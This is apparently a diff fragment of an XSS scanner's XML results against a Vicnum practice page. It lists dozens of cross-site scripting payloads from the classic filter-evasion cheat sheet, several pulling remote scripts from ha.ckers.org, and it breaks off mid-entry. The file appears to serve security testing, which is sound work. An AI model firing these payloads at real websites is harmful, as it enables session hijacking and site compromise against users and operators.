+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT></parameter>
+	<type name='XSS Injection Type'>Evade Regex Filter 5</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CSCRIPT+a%3D%60%3E%60+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT></parameter>
+	<type name='XSS Injection Type'>Filter Evasion 1</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CSCRIPT%3Edocument.write%28%22%3CSCRI%22%29%3B%3C%2FSCRIPT%3EPT+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT></parameter>
+	<type name='XSS Injection Type'>Filter Evasion 2</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CSCRIPT+a%3D%22%3E%27%3E%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><A HREF="http://66.102.7.147/">XSS</A></parameter>
+	<type name='XSS Injection Type'>IP Encoding</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CA+HREF%3D%22http%3A%2F%2F66.102.7.147%2F%22%3EXSS%3C%2FA%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><A HREF="//www.google.com/">XSS</A></parameter>
+	<type name='XSS Injection Type'>Protocol Resolution Bypass</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CA+HREF%3D%22%2F%2Fwww.google.com%2F%22%3EXSS%3C%2FA%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><A HREF="//google">XSS</A></parameter>
+	<type name='XSS Injection Type'>Firefox Lookups 1</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CA+HREF%3D%22%2F%2Fgoogle%22%3EXSS%3C%2FA%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><A HREF="http://ha.ckers.org@google">XSS</A></parameter>
+	<type name='XSS Injection Type'>Firefox Lookups 2</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CA+HREF%3D%22http%3A%2F%2Fha.ckers.org%40google%22%3EXSS%3C%2FA%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><A HREF="http://google:ha.ckers.org">XSS</A></parameter>
+	<type name='XSS Injection Type'>Firefox Lookups 3</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CA+HREF%3D%22http%3A%2F%2Fgoogle%3Aha.ckers.org%22%3EXSS%3C%2FA%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><A HREF="http://google.com/">XSS</A></parameter>
+	<type name='XSS Injection Type'>Removing Cnames</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CA+HREF%3D%22http%3A%2F%2Fgoogle.com%2F%22%3EXSS%3C%2FA%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><A HREF="http://www.google.com./">XSS</A></parameter>
+	<type name='XSS Injection Type'>Extra dot for Absolute DNS</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CA+HREF%3D%22http%3A%2F%2Fwww.google.com.%2F%22%3EXSS%3C%2FA%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><A HREF="javascript:document.location='http://www.google.com/'">XSS</A></parameter>
+	<type name='XSS Injection Type'>JavaScript Link Location</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CA+HREF%3D%22javascript%3Adocument.location%3D%27http%3A%2F%2Fwww.google.com%2F%27%22%3EXSS%3C%2FA%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><A HREF="http://www.gohttp://www.google.com/ogle.com/">XSS</A></parameter>
+	<type name='XSS Injection Type'>Content Replace</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CA+HREF%3D%22http%3A%2F%2Fwww.gohttp%3A%2F%2Fwww.google.com%2Fogle.com%2F%22%3EXSS%3C%2FA%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><SCRIPT>alert('XSS')</SCRIPT></parameter>
+	<type name='XSS Injection Type'>SCRIPT w/Alert()</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CSCRIPT%3Ealert%28%27XSS%27%29%3C%2FSCRIPT%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT></parameter>
+	<type name='XSS Injection Type'>SCRIPT w/Source File</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CSCRIPT+SRC%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js%3E%3C%2FSCRIPT%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT></parameter>
+	<type name='XSS Injection Type'>SCRIPT w/Char Code</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><BASE HREF="javascript:alert('XSS');//"></parameter>
+	<type name='XSS Injection Type'>BASE</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CBASE+HREF%3D%22javascript%3Aalert%28%27XSS%27%29%3B%2F%2F%22%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><BGSOUND SRC="javascript:alert('XSS');"></parameter>
+	<type name='XSS Injection Type'>BGSOUND</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CBGSOUND+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><DIV STYLE="background-image: url(javascript:alert('XSS'))"></parameter>
+	<type name='XSS Injection Type'>DIV background-image 1</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CDIV+STYLE%3D%22background-image%3A+url%28javascript%3Aalert%28%27XSS%27%29%29%22%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))"></parameter>
+	<type name='XSS Injection Type'>DIV background-image 2</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CDIV+STYLE%3D%22background-image%3A+url%28%26%231%3Bjavascript%3Aalert%28%27XSS%27%29%29%22%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><DIV STYLE="width: expression(alert('XSS'));"></parameter>
+	<type name='XSS Injection Type'>DIV expression</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CDIV+STYLE%3D%22width%3A+expression%28alert%28%27XSS%27%29%29%3B%22%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><IFRAME SRC="javascript:alert('XSS');"></IFRAME></parameter>
+	<type name='XSS Injection Type'>IFRAME</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CIFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FIFRAME%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');"></parameter>
+	<type name='XSS Injection Type'>INPUT Image</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CINPUT+TYPE%3D%22IMAGE%22+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><IMG SRC="javascript:alert('XSS');"></parameter>
+	<type name='XSS Injection Type'>IMG w/JavaScript Directive</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CIMG+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><IMG SRC=javascript:alert('XSS')></parameter>
+	<type name='XSS Injection Type'>IMG No Quotes/Semicolon</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CIMG+SRC%3Djavascript%3Aalert%28%27XSS%27%29%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><IMG DYNSRC="javascript:alert('XSS');"></parameter>
+	<type name='XSS Injection Type'>IMG Dynsrc</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CIMG+DYNSRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><IMG LOWSRC="javascript:alert('XSS');"></parameter>
+	<type name='XSS Injection Type'>IMG Lowsrc</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CIMG+LOWSRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"></parameter>
+	<type name='XSS Injection Type'>IMG Embedded commands 1</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CIMG+SRC%3D%22http%3A%2F%2Fwww.thesiteyouareon.com%2Fsomecommand.php%3Fsomevariables%3Dmaliciouscode%22%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'>Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser</parameter>
+	<type name='XSS Injection Type'>IMG Embedded commands 2</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=Redirect+302+%2Fa.jpg+http%3A%2F%2Fvictimsite.com%2Fadmin.asp%26deleteuser</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</parameter>
+	<type name='XSS Injection Type'>List-style-image</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CSTYLE%3Eli+%7Blist-style-image%3A+url%28%22javascript%3Aalert%28%27XSS%27%29%22%29%3B%7D%3C%2FSTYLE%3E%3CUL%3E%3CLI%3EXSS</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><IMG SRC='vbscript:msgbox("XSS")'></parameter>
+	<type name='XSS Injection Type'>IMG w/VBscript</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CIMG+SRC%3D%27vbscript%3Amsgbox%28%22XSS%22%29%27%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><LAYER SRC="http://ha.ckers.org/scriptlet.html"></LAYER></parameter>
+	<type name='XSS Injection Type'>LAYER</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CLAYER+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fscriptlet.html%22%3E%3C%2FLAYER%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><IMG SRC="livescript:[code]"></parameter>
+	<type name='XSS Injection Type'>Livescript</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CIMG+SRC%3D%22livescript%3A%5Bcode%5D%22%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');"></parameter>
+	<type name='XSS Injection Type'>META</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CMETA+HTTP-EQUIV%3D%22refresh%22+CONTENT%3D%220%3Burl%3Djavascript%3Aalert%28%27XSS%27%29%3B%22%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><IMG SRC="mocha:[code]"></parameter>
+	<type name='XSS Injection Type'>Mocha</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CIMG+SRC%3D%22mocha%3A%5Bcode%5D%22%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT></parameter>
+	<type name='XSS Injection Type'>OBJECT</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3COBJECT+TYPE%3D%22text%2Fx-scriptlet%22+DATA%3D%22http%3A%2F%2Fha.ckers.org%2Fscriptlet.html%22%3E%3C%2FOBJECT%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED></parameter>
+	<type name='XSS Injection Type'>Embed Flash</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CEMBED+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.swf%22+AllowScriptAccess%3D%22always%22%3E%3C%2FEMBED%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><STYLE TYPE="text/javascript">alert('XSS');</STYLE></parameter>
+	<type name='XSS Injection Type'>STYLE</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CSTYLE+TYPE%3D%22text%2Fjavascript%22%3Ealert%28%27XSS%27%29%3B%3C%2FSTYLE%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><XSS STYLE="xss:expression(alert('XSS'))"></parameter>
+	<type name='XSS Injection Type'>STYLE w/Anonymous HTML</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CXSS+STYLE%3D%22xss%3Aexpression%28alert%28%27XSS%27%29%29%22%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A></parameter>
+	<type name='XSS Injection Type'>STYLE w/background-image</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CSTYLE%3E.XSS%7Bbackground-image%3Aurl%28%22javascript%3Aalert%28%27XSS%27%29%22%29%3B%7D%3C%2FSTYLE%3E%3CA+CLASS%3DXSS%3E%3C%2FA%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE></parameter>
+	<type name='XSS Injection Type'>STYLE w/background</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CSTYLE+type%3D%22text%2Fcss%22%3EBODY%7Bbackground%3Aurl%28%22javascript%3Aalert%28%27XSS%27%29%22%29%7D%3C%2FSTYLE%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><LINK REL="stylesheet" HREF="javascript:alert('XSS');"></parameter>
+	<type name='XSS Injection Type'>Stylesheet</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CLINK+REL%3D%22stylesheet%22+HREF%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css"></parameter>
+	<type name='XSS Injection Type'>Remote Stylesheet 1</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CLINK+REL%3D%22stylesheet%22+HREF%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.css%22%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><STYLE>@import'http://ha.ckers.org/xss.css';</STYLE></parameter>
+	<type name='XSS Injection Type'>Remote Stylesheet 2</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CSTYLE%3E%40import%27http%3A%2F%2Fha.ckers.org%2Fxss.css%27%3B%3C%2FSTYLE%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet"></parameter>
+	<type name='XSS Injection Type'>Remote Stylesheet 3</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CMETA+HTTP-EQUIV%3D%22Link%22+Content%3D%22%3Chttp%3A%2F%2Fha.ckers.org%2Fxss.css%3E%3B+REL%3Dstylesheet%22%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE></parameter>
+	<type name='XSS Injection Type'>Remote Stylesheet 4</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CSTYLE%3EBODY%7B-moz-binding%3Aurl%28%22http%3A%2F%2Fha.ckers.org%2Fxssmoz.xml%23xss%22%29%7D%3C%2FSTYLE%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><TABLE><TD BACKGROUND="javascript:alert('XSS')"></TD></TABLE></parameter>
+	<type name='XSS Injection Type'>TD</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CTABLE%3E%3CTD+BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E%3C%2FTD%3E%3C%2FTABLE%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><HTML xmlns:xss> <?import namespace="xss" implementation="http://ha.ckers.org/xss.htc"> <xss:xss>XSS</xss:xss> </HTML></parameter>
+	<type name='XSS Injection Type'>XML namespace</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CHTML+xmlns%3Axss%3E+%3C%3Fimport+namespace%3D%22xss%22+implementation%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.htc%22%3E+%3Cxss%3Axss%3EXSS%3C%2Fxss%3Axss%3E+%3C%2FHTML%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><XSS STYLE="behavior: url(http://ha.ckers.org/xss.htc);"></parameter>
+	<type name='XSS Injection Type'>Local .htc file</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CXSS+STYLE%3D%22behavior%3A+url%28http%3A%2F%2Fha.ckers.org%2Fxss.htc%29%3B%22%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT></parameter>
+	<type name='XSS Injection Type'>Rename .js to .jpg</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CSCRIPT+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.jpg%22%3E%3C%2FSCRIPT%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><!--#exec cmd="/bin/echo '<SCRIPT SRC'"--><!--#exec cmd="/bin/echo '=http://ha.ckers.org/xss.js></SCRIPT>'"--></parameter>
+	<type name='XSS Injection Type'>SSI</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3C%21--%23exec+cmd%3D%22%2Fbin%2Fecho+%27%3CSCRIPT+SRC%27%22--%3E%3C%21--%23exec+cmd%3D%22%2Fbin%2Fecho+%27%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js%3E%3C%2FSCRIPT%3E%27%22--%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><? echo('<SCR)'; echo('IPT>alert("XSS")</SCRIPT>'); ?></parameter>
+	<type name='XSS Injection Type'>PHP</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3C%3F+echo%28%27%3CSCR%29%27%3B+echo%28%27IPT%3Ealert%28%22XSS%22%29%3C%2FSCRIPT%3E%27%29%3B+%3F%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><IMG SRC=JaVaScRiPt:alert('XSS')></parameter>
+	<type name='XSS Injection Type'>Case Insensitive</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CIMG+SRC%3DJaVaScRiPt%3Aalert%28%27XSS%27%29%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><IMG SRC=javascript:alert(&quot;XSS&quot;)></parameter>
+	<type name='XSS Injection Type'>HTML Entities</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CIMG+SRC%3Djavascript%3Aalert%28%26quot%3BXSS%26quot%3B%29%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><IMG SRC=`javascript:alert("RSnake says, 'XSS'")`></parameter>
+	<type name='XSS Injection Type'>Grave Accents</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CIMG+SRC%3D%60javascript%3Aalert%28%22RSnake+says%2C+%27XSS%27%22%29%60%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><IMG SRC=javascript:alert(String.fromCharCode(88,83,83))></parameter>
+	<type name='XSS Injection Type'>Image w/CharCode</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CIMG+SRC%3Djavascript%3Aalert%28String.fromCharCode%2888%2C83%2C83%29%29%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'>\";alert('XSS');//</parameter>
+	<type name='XSS Injection Type'>Escaping JavaScript escapes</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%5C%22%3Balert%28%27XSS%27%29%3B%2F%2F</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'></TITLE><SCRIPT>alert("XSS");</SCRIPT></parameter>
+	<type name='XSS Injection Type'>End title tag</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3C%2FTITLE%3E%3CSCRIPT%3Ealert%28%22XSS%22%29%3B%3C%2FSCRIPT%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE></parameter>
+	<type name='XSS Injection Type'>STYLE w/broken up JavaScript</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CSTYLE%3E%40im%5Cport%27%5Cja%5Cvasc%5Cript%3Aalert%28%22XSS%22%29%27%3B%3C%2FSTYLE%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><IMG SRC="jav ascript:alert('XSS');"></parameter>
+	<type name='XSS Injection Type'>Embedded Tab</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CIMG+SRC%3D%22jav+ascript%3Aalert%28%27XSS%27%29%3B%22%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><IMG SRC="jav&#x09;ascript:alert('XSS');"></parameter>
+	<type name='XSS Injection Type'>Embedded Encoded Tab</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CIMG+SRC%3D%22jav%26%23x09%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><IMG SRC="jav&#x0A;ascript:alert('XSS');"></parameter>
+	<type name='XSS Injection Type'>Embedded Newline</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CIMG+SRC%3D%22jav%26%23x0A%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><IMG SRC="jav&#x0D;ascript:alert('XSS');"></parameter>
+	<type name='XSS Injection Type'>Embedded Carriage Return</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CIMG+SRC%3D%22jav%26%23x0D%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><IMG SRC = " j a v a s c r i p t : a l e r t ( ' X S S ' ) " ></parameter>
+	<type name='XSS Injection Type'>Multiline w/Carriage Returns</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CIMG+SRC+%3D+%22+j+a+v+a+s+c+r+i+p+t+%3A+a+l+e+r+t+%28+%27+X+S+S+%27+%29+%22+%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'>perl -e 'print "<IMG SRC=java\0script:alert("XSS")>";'> out</parameter>
+	<type name='XSS Injection Type'>Null Chars 1</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=perl+-e+%27print+%22%3CIMG+SRC%3Djava%00script%3Aalert%28%22XSS%22%29%3E%22%3B%27%3E+out</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'>perl -e 'print "&<SCR\0IPT>alert("XSS")</SCR\0IPT>";' > out</parameter>
+	<type name='XSS Injection Type'>Null Chars 2</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=perl+-e+%27print+%22%26%3CSCR%00IPT%3Ealert%28%22XSS%22%29%3C%2FSCR%00IPT%3E%22%3B%27+%3E+out</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><IMG SRC=" &#14; javascript:alert('XSS');"></parameter>
+	<type name='XSS Injection Type'>Spaces/Meta Chars</type>
